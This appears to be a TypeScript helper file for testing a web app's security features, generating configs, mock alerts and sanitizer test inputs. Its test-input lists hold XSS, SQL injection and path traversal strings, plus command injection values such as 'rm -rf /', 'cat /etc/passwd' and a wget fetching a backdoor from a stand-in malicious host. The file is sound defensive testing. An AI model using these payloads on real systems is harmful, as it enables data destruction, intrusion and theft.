// ======================================
// SECURITY TESTING UTILITIES
// ======================================
// Helper functions untuk security testing
// Memudahkan testing security features

import { SecurityConfig, SecurityEvent, SecurityAlert, ViolationType, RiskLevel } from '../types/security.types';

// Test data generators
export const generateTestSecurityConfig = (overrides: Partial<SecurityConfig> = {}): SecurityConfig => {
  return {
    rateLimiting: {
      windowMs: 15 * 60 * 1000,
      maxRequests: 100,
      skipSuccessfulRequests: false,
      skipFailedRequests: false,
      standardHeaders: true,
      legacyHeaders: false,
      enableProgressiveLimiting: false,
      progressivePenalty: 1,
      enableSmartLimiting: false,
      whitelistIPs: [],
      blacklistIPs: [],
      authWindowMs: 5 * 60 * 1000,
      authMaxRequests: 5,
      apiWindowMs: 1 * 60 * 1000,
      apiMaxRequests: 60,
      uploadWindowMs: 10 * 60 * 1000,
      uploadMaxRequests: 10
    },
    sanitization: {
      stripHtml: true,
      normalizeEmail: true,
      escapeSpecialChars: true,
      maxStringLength: 1000,
      allowedTags: ['b', 'i', 'em', 'strong'],
      allowedAttributes: {},
      enableXSSProtection: true,
      enableSQLInjectionProtection: true,
      enablePathTraversalProtection: true,
      enableCommandInjectionProtection: true,
      customRules: {
        email: { pattern: /^[^\s@]+@[^\s@]+\.[^\s@]+$/, maxLength: 255 },
        phone: { pattern: /^[\d\s\-\+\(\)]+$/, maxLength: 20 },
        url: { pattern: /^https?:\/\/.+/, maxLength: 500 },
        nip: { pattern: /^\d{18,20}$/, maxLength: 20 }
      },
      fieldSanitization: {}
    },
    fileUpload: {
      maxFileSize: 5 * 1024 * 1024,
      allowedMimeTypes: ['image/jpeg', 'image/png', 'application/pdf'],
      allowedExtensions: ['.jpg', '.jpeg', '.png', '.pdf'],
      scanForMalware: false,
      quarantineFolder: './quarantine',
      enableMagicBytesCheck: true,
      enableFileSignatureValidation: true,
      enableContentTypeValidation: true,
      enableImageProcessing: false,
      imageProcessingOptions: {
        resize: { maxWidth: 1920, maxHeight: 1080 },
        quality: 85,
        format: 'jpeg'
      },
      virusScanTimeout: 30000,
      maxFilesPerRequest: 5,
      maxTotalSizePerRequest: 25 * 1024 * 1024,
      tempFolder: './temp',
      cleanupTempFiles: true,
      tempFileExpiry: 3600000
    },
    headers: {
      contentSecurityPolicy: {
        directives: {
          'default-src': ["'self'"],
          'script-src': ["'self'"],
          'style-src': ["'self'"]
        },
        reportOnly: false
      },
      hsts: {
        maxAge: 31536000,
        includeSubDomains: true,
        preload: false
      },
      frameOptions: 'DENY',
      contentTypeOptions: true,
      xssProtection: true,
      referrerPolicy: 'strict-origin-when-cross-origin',
      permissionsPolicy: {},
      crossOriginEmbedderPolicy: 'require-corp',
      crossOriginOpenerPolicy: 'same-origin',
      crossOriginResourcePolicy: 'same-origin',
      originAgentCluster: true,
      customHeaders: {}
    },
    sqlPrevention: {
      enablePreparedStatements: true,
      enableQueryLogging: false,
      blockSuspiciousPatterns: true,
      suspiciousPatterns: ['DROP', 'DELETE', 'INSERT', 'UPDATE', 'UNION'],
      enableQueryValidation: true,
      enableParameterValidation: true,
      enableQueryLengthLimit: true,
      maxQueryLength: 1000,
      allowedFields: ['id', 'name', 'email', 'created_at'],
      enableQueryMonitoring: false,
      suspiciousQueryThreshold: 5,
      validatePreparedStatements: true,
      requireParameterizedQueries: true
    },
    testing: {
      enablePenetrationTesting: false,
      testFrequency: 'weekly',
      reportPath: './security-reports',
      alertThreshold: 3,
      enableAutomatedTesting: false,
      testTypes: ['vulnerability', 'penetration'],
      testTimeout: 300000,
      maxTestConcurrency: 5,
      enableDetailedReports: true,
      enableEmailAlerts: false,
      alertEmailRecipients: [],
      testDataPath: './test-data',
      enableTestDataCleanup: true
    },
    monitoring: {
      enableSecurityMonitoring: true,
      enableRealTimeAlerts: false,
      alertChannels: ['console'],
      alertThresholds: {
        rateLimitViolations: 10,
        sqlInjectionAttempts: 5,
        xssAttempts: 5,
        fileUploadViolations: 3,
        authenticationFailures: 10
      },
      enableDetailedLogging: true,
      logSecurityEvents: true,
      logRetentionDays: 30,
      enablePerformanceMonitoring: false,
      performanceThresholds: {
        responseTime: 1000,
        memoryUsage: 80,
        cpuUsage: 80
      }
    },
    advanced: {
      enableRequestValidation: true,
      enableResponseSanitization: false,
      enableSessionSecurity: true,
      enableCSRFProtection: false,
      enableClickjackingProtection: false,
      enableMIMESniffingProtection: true,
      enableResponseEncryption: false,
      encryptionAlgorithm: 'AES-256',
      sessionTimeout: 3600000,
      sessionRenewalThreshold: 300000,
      maxConcurrentSessions: 5,
      enableAPIVersioning: false,
      enableAPIDocumentation: true,
      enableAPIRateLimitPerUser: false,
      enableCacheSecurity: true,
      cacheSecurityHeaders: true,
      preventCacheLeakage: true
    },
    ...overrides
  };
};

// Generate test security events
export const generateTestSecurityEvents = (count: number = 10): SecurityEvent[] => {
  const eventTypes: SecurityEvent['type'][] = ['violation', 'alert', 'test', 'metric', 'incident'];
  const sources = ['auth', 'file_upload', 'api', 'rate_limiter'];
  const severities: RiskLevel[] = [RiskLevel.LOW, RiskLevel.MEDIUM, RiskLevel.HIGH, RiskLevel.CRITICAL];
  
  const events: SecurityEvent[] = [];
  
  for (let i = 0; i < count; i++) {
    events.push({
      id: `event-${i + 1}`,
      type: eventTypes[Math.floor(Math.random() * eventTypes.length)],
      severity: severities[Math.floor(Math.random() * severities.length)],
      timestamp: new Date(Date.now() - Math.random() * 24 * 60 * 60 * 1000),
      source: sources[Math.floor(Math.random() * sources.length)],
      data: {
        ipAddress: `192.168.1.${Math.floor(Math.random() * 255)}`,
        userAgent: 'Test User Agent',
        userId: `user-${Math.floor(Math.random() * 100)}`
      },
      processed: false
    });
  }
  
  return events;
};

// Generate test security alerts
export const generateTestSecurityAlerts = (count: number = 5): SecurityAlert[] => {
  const alertTypes: ViolationType[] = [
    ViolationType.RATE_LIMIT_EXCEEDED,
    ViolationType.MALICIOUS_INPUT,
    ViolationType.FILE_UPLOAD_VIOLATION,
    ViolationType.UNAUTHORIZED_ACCESS
  ];
  const severities: RiskLevel[] = [RiskLevel.LOW, RiskLevel.MEDIUM, RiskLevel.HIGH, RiskLevel.CRITICAL];
  
  const alerts: SecurityAlert[] = [];
  
  for (let i = 0; i < count; i++) {
    alerts.push({
      id: `alert-${i + 1}`,
      type: alertTypes[Math.floor(Math.random() * alertTypes.length)],
      severity: severities[Math.floor(Math.random() * severities.length)],
      message: `Test security alert ${i + 1}`,
      timestamp: new Date(Date.now() - Math.random() * 24 * 60 * 60 * 1000),
      context: {
        requestId: `req-${i + 1}`,
        userAgent: 'Test User Agent',
        ipAddress: `192.168.1.${Math.floor(Math.random() * 255)}`,
        timestamp: new Date(),
        riskLevel: severities[Math.floor(Math.random() * severities.length)],
        violations: [],
        endpoint: '/api/test',
        method: 'GET',
        requestSize: 1024,
        securityScore: Math.floor(Math.random() * 100),
        threatIndicators: []
      },
      acknowledged: Math.random() > 0.5,
      resolved: Math.random() > 0.7,
      acknowledgedBy: Math.random() > 0.5 ? `admin-${Math.floor(Math.random() * 10)}` : undefined,
      resolvedBy: Math.random() > 0.7 ? `admin-${Math.floor(Math.random() * 10)}` : undefined,
      acknowledgedAt: Math.random() > 0.5 ? new Date() : undefined,
      resolvedAt: Math.random() > 0.7 ? new Date() : undefined
    });
  }
  
  return alerts;
};

// Test input data for sanitization testing
export const generateTestInputs = () => {
  return {
    // XSS test inputs
    xssInputs: [
      '<script>alert("XSS")</script>',
      'javascript:alert("XSS")',
      '<img src="x" onerror="alert(\'XSS\')">',
      '<svg onload="alert(\'XSS\')">',
      '"><script>alert("XSS")</script>'
    ],
    
    // SQL injection test inputs
    sqlInjectionInputs: [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "'; INSERT INTO users VALUES ('hacker', 'password'); --",
      "' UNION SELECT * FROM users --",
      "'; UPDATE users SET password='hacked' --"
    ],
    
    // Path traversal test inputs
    pathTraversalInputs: [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd'
    ],
    
    // Command injection test inputs
    commandInjectionInputs: [
      '; rm -rf /',
      '| cat /etc/passwd',
      '&& whoami',
      '; ls -la',
      '| wget http://malicious.com/backdoor'
    ],
    
    // Valid inputs for comparison
    validInputs: [
      'John Doe',
      'john.doe@example.com',
      'Hello, this is a normal message.',
      '123 Main Street, City, Country',
      'https://example.com'
    ]
  };
};

// Test file data for file upload testing
export const generateTestFiles = () => {
  return {
    // Valid files
    validFiles: [
      {
        name: 'test-image.jpg',
        mimetype: 'image/jpeg',
        size: 1024 * 1024, // 1MB
        buffer: Buffer.from('fake image data')
      },
      {
        name: 'document.pdf',
        mimetype: 'application/pdf',
        size: 2 * 1024 * 1024, // 2MB
        buffer: Buffer.from('fake pdf data')
      }
    ],
    
    // Invalid files
    invalidFiles: [
      {
        name: 'malicious.exe',
        mimetype: 'application/x-executable',
        size: 1024 * 1024,
        buffer: Buffer.from('fake executable data')
      },
      {
        name: 'script.php',
        mimetype: 'application/x-php',
        size: 1024,
        buffer: Buffer.from('<?php echo "malicious"; ?>')
      },
      {
        name: 'large-file.zip',
        mimetype: 'application/zip',
        size: 100 * 1024 * 1024, // 100MB
        buffer: Buffer.from('fake large file data')
      }
    ]
  };
};

// Test rate limiting scenarios
export const generateRateLimitTests = () => {
  return {
    // Normal requests (should pass)
    normalRequests: Array.from({ length: 50 }, (_, i) => ({
      ip: '192.168.1.100',
      timestamp: new Date(Date.now() - i * 1000),
      endpoint: '/api/test'
    })),
    
    // Rapid requests (should be rate limited)
    rapidRequests: Array.from({ length: 200 }, (_, i) => ({
      ip: '192.168.1.101',
      timestamp: new Date(Date.now() - i * 100), // 100ms apart
      endpoint: '/api/test'
    })),
    
    // Different IPs (should not interfere)
    differentIPs: Array.from({ length: 100 }, (_, i) => ({
      ip: `192.168.1.${100 + i}`,
      timestamp: new Date(Date.now() - i * 1000),
      endpoint: '/api/test'
    }))
  };
};

// Test authentication scenarios
export const generateAuthTests = () => {
  return {
    // Valid credentials
    validCredentials: [
      { email: 'admin@example.com', password: 'admin123' },
      { email: 'user@example.com', password: 'user123' }
    ],
    
    // Invalid credentials
    invalidCredentials: [
      { email: 'admin@example.com', password: 'wrongpassword' },
      { email: 'nonexistent@example.com', password: 'anypassword' },
      { email: '', password: 'anypassword' },
      { email: 'admin@example.com', password: '' }
    ],
    
    // Malicious inputs
    maliciousCredentials: [
      { email: '<script>alert("XSS")</script>', password: 'password' },
      { email: "'; DROP TABLE users; --", password: 'password' },
      { email: 'admin@example.com', password: "'; DROP TABLE users; --" }
    ]
  };
};

// Test helpers for assertions
export const createTestAssertions = () => {
  return {
    // Assert that input was sanitized
    assertInputSanitized: (original: string, sanitized: string) => {
      const xssPatterns = [
        /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,
        /javascript:/gi,
        /on\w+\s*=/gi
      ];
      
      const sqlPatterns = [
        /';?\s*drop\s+table/gi,
        /';?\s*insert\s+into/gi,
        /';?\s*update\s+\w+\s+set/gi,
        /union\s+select/gi
      ];
      
      // Check if dangerous patterns were removed
      for (const pattern of xssPatterns) {
        if (pattern.test(original) && !pattern.test(sanitized)) {
          return true; // Sanitization worked
        }
      }
      
      for (const pattern of sqlPatterns) {
        if (pattern.test(original) && !pattern.test(sanitized)) {
          return true; // Sanitization worked
        }
      }
      
      return false; // Sanitization may have failed
    },
    
    // Assert that rate limiting is working
    assertRateLimited: (requests: any[], maxRequests: number) => {
      const requestCounts = new Map<string, number>();
      
      requests.forEach(req => {
        const key = req.ip;
        requestCounts.set(key, (requestCounts.get(key) || 0) + 1);
      });
      
      return Array.from(requestCounts.values()).every(count => count <= maxRequests);
    },
    
    // Assert that file upload validation is working
    assertFileUploadValidated: (files: any[], allowedTypes: string[], maxSize: number) => {
      return files.every(file => {
        const typeValid = allowedTypes.includes(file.mimetype);
        const sizeValid = file.size <= maxSize;
        return typeValid && sizeValid;
      });
    },
    
    // Assert that security headers are present
    assertSecurityHeaders: (headers: Record<string, string>) => {
      const requiredHeaders = [
        'X-Content-Type-Options',
        'X-Frame-Options',
        'X-XSS-Protection'
      ];
      
      return requiredHeaders.every(header => headers[header] !== undefined);
    }
  };
};

// Mock security integration for testing
export const createMockSecurityIntegration = () => {
  const events: SecurityEvent[] = [];
  const alerts: SecurityAlert[] = [];
  let requestCount = 0;
  let blockedCount = 0;
  
  return {
    // Mock methods
    getSecurityMetrics: () => ({
      totalRequests: requestCount,
      blockedRequests: blockedCount,
      securityScore: 85,
      violationsByType: {
        'rate_limit': blockedCount,
        'xss_attempt': 0,
        'sql_injection': 0
      },
      impactOnResponseTime: 5,
      memoryOverhead: 2,
      cpuOverhead: 1
    }),
    
    getSecurityPerformance: () => ({
      getPerformanceScore: () => 90,
      isPerformanceAcceptable: () => true,
      getDetailedMetrics: () => ({
        current: {
          impactOnResponseTime: 5,
          memoryOverhead: 2,
          cpuOverhead: 1
        },
        measurements: {}
      })
    }),
    
    getSecurityMonitoring: () => ({
      getEvents: () => events,
      getAlerts: () => alerts,
      getUnacknowledgedAlerts: () => alerts.filter(a => !a.acknowledged),
      getUnresolvedAlerts: () => alerts.filter(a => !a.resolved),
      acknowledgeAlert: (id: string, by: string) => {
        const alert = alerts.find(a => a.id === id);
        if (alert) {
          alert.acknowledged = true;
          alert.acknowledgedBy = by;
          alert.acknowledgedAt = new Date();
        }
      },
      resolveAlert: (id: string, by: string) => {
        const alert = alerts.find(a => a.id === id);
        if (alert) {
          alert.resolved = true;
          alert.resolvedBy = by;
          alert.resolvedAt = new Date();
        }
      }
    }),
    
    // Test helpers
    addEvent: (event: SecurityEvent) => {
      events.push(event);
    },
    
    addAlert: (alert: SecurityAlert) => {
      alerts.push(alert);
    },
    
    incrementRequests: () => {
      requestCount++;
    },
    
    incrementBlocked: () => {
      blockedCount++;
    },
    
    reset: () => {
      events.length = 0;
      alerts.length = 0;
      requestCount = 0;
      blockedCount = 0;
    }
  };
};

// Test utilities for common security scenarios
export const createSecurityTestUtils = () => {
  return {
    // Test XSS protection
    testXSSProtection: (sanitizer: any) => {
      const testInputs = generateTestInputs();
      const results = testInputs.xssInputs.map(input => ({
        original: input,
        sanitized: sanitizer.sanitize(input),
        isSafe: !sanitizer.sanitize(input).includes('<script>')
      }));
      
      return {
        passed: results.every(r => r.isSafe),
        results
      };
    },
    
    // Test SQL injection protection
    testSQLInjectionProtection: (validator: any) => {
      const testInputs = generateTestInputs();
      const results = testInputs.sqlInjectionInputs.map(input => ({
        original: input,
        isValid: validator.validate(input),
        isSafe: !validator.validate(input)
      }));
      
      return {
        passed: results.every(r => !r.isValid),
        results
      };
    },
    
    // Test rate limiting
    testRateLimiting: (limiter: any) => {
      const testData = generateRateLimitTests();
      const results = testData.rapidRequests.map(req => ({
        ip: req.ip,
        timestamp: req.timestamp,
        isAllowed: limiter.checkLimit(req.ip, req.timestamp)
      }));
      
      const blockedCount = results.filter(r => !r.isAllowed).length;
      
      return {
        passed: blockedCount > 0,
        totalRequests: results.length,
        blockedRequests: blockedCount,
        results
      };
    },
    
    // Test file upload validation
    testFileUploadValidation: (validator: any, allowedTypes: string[], maxSize: number) => {
      const testFiles = generateTestFiles();
      const results = {
        valid: testFiles.validFiles.map(file => ({
          file,
          isValid: validator.validate(file, allowedTypes, maxSize)
        })),
        invalid: testFiles.invalidFiles.map(file => ({
          file,
          isValid: validator.validate(file, allowedTypes, maxSize)
        }))
      };
      
      return {
        passed: results.valid.every(r => r.isValid) && results.invalid.every(r => !r.isValid),
        validResults: results.valid,
        invalidResults: results.invalid
      };
    }
  };
};
